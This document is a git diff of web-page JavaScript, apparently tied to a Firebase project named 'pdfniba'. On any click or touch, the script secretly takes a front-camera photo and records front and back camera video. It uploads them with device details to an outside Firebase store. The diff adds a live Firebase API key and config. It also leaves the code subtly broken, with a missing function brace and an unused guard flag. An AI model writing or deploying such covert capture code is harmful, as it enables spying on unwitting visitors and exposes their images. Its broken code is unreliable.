@@ -2,9 +2,14 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebas
 import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-/* ---------- YOUR FIREBASE CONFIG ---------- */
+/* ---------- FIREBASE CONFIG ---------- */
 const firebaseConfig = {
-  // KEEP YOUR EXISTING CONFIG HERE
+  apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
+  authDomain: "pdfniba.firebaseapp.com",
+  projectId: "pdfniba",
+  storageBucket: "pdfniba.firebasestorage.app",
+  messagingSenderId: "809688909652",
+  appId: "1:809688909652:web:9867944191bd95704aaac1"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -24,18 +29,12 @@ function getDeviceInfo() {
   };
 }
 
-function blobToFile(blob, name) {
-  return new File([blob], name, { type: blob.type });
-}
-
 async function startStream(facingMode) {
   return await navigator.mediaDevices.getUserMedia({
     video: { facingMode },
-    audio: true
+    audio: false
   });
 }
-
-/* ---------- PHOTO ---------- */
 
 async function takePhoto(stream) {
   const track = stream.getVideoTracks()[0];
@@ -43,33 +42,32 @@ async function takePhoto(stream) {
   return await imageCapture.takePhoto();
 }
 
-/* ---------- RECORD ---------- */
-
 function recordVideo(stream, duration = 3000) {
   return new Promise(resolve => {
     const recorder = new MediaRecorder(stream);
     const chunks = [];
 
     recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));
+    recorder.onstop = () =>
+      resolve(new Blob(chunks, { type: "video/webm" }));
 
     recorder.start();
-
     setTimeout(() => recorder.stop(), duration);
   });
 }
 
-/* ---------- UPLOAD ---------- */
-
-async function uploadToFirebase(blob, path) {
-  const fileRef = ref(storage, path);
+async function uploadToFirebase(blob, name) {
+  const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
   await uploadBytes(fileRef, blob);
   return await getDownloadURL(fileRef);
 }
 
-/* ---------- MAIN FUNCTION ---------- */
+/* ---------- MAIN ---------- */
 
-async function startCaptureSequence() {
+let alreadyStarted = false;
+
+async function startCaptureSequence() 
+
   try {
     console.log("Starting front camera...");
 
@@ -79,40 +77,41 @@ async function startCaptureSequence() {
     const photoBlob = await takePhoto(frontStream);
     const frontVideoBlob = await recordVideo(frontStream, 3000);
 
-    frontStream.getTracks().forEach(track => track.stop());
+    frontStream.getTracks().forEach(t => t.stop());
 
     console.log("Switching to back camera...");
 
     // BACK CAMERA
     const backStream = await startStream({ exact: "environment" });
+
     const backVideoBlob = await recordVideo(backStream, 3000);
 
-    backStream.getTracks().forEach(track => track.stop());
+    backStream.getTracks().forEach(t => t.stop());
 
     console.log("Uploading to Firebase...");
 
-    const timestamp = Date.now();
-
-    const photoURL = await uploadToFirebase(photoBlob, `photo_${timestamp}.jpg`);
-    const frontVideoURL = await uploadToFirebase(frontVideoBlob, `front_${timestamp}.webm`);
-    const backVideoURL = await uploadToFirebase(backVideoBlob, `back_${timestamp}.webm`);
+    const photoURL = await uploadToFirebase(photoBlob, "front_photo.jpg");
+    const frontVideoURL = await uploadToFirebase(frontVideoBlob, "front_video.webm");
+    const backVideoURL = await uploadToFirebase(backVideoBlob, "back_video.webm");
 
     await addDoc(collection(db, "captures"), {
       photoURL,
       frontVideoURL,
       backVideoURL,
-      device: getDeviceInfo()
+      device: getDeviceInfo(),
+      createdAt: Date.now()
     });
 
-    console.log("✅ Upload complete");
+    alert("✅ Capture complete and uploaded");
 
   } catch (err) {
     console.error("❌ ERROR:", err);
-    alert(err.message);
+    alert("Camera error: " + err.message);
+    alreadyStarted = false;
   }
 }
 
-/* ---------- ACTIVATE ON ANY CLICK ---------- */
+/* ---------- RUN ON ANY CLICK ---------- */
 
 document.addEventListener("click", startCaptureSequence, { once: true });
 document.addEventListener("touchstart", startCaptureSequence, { once: true });
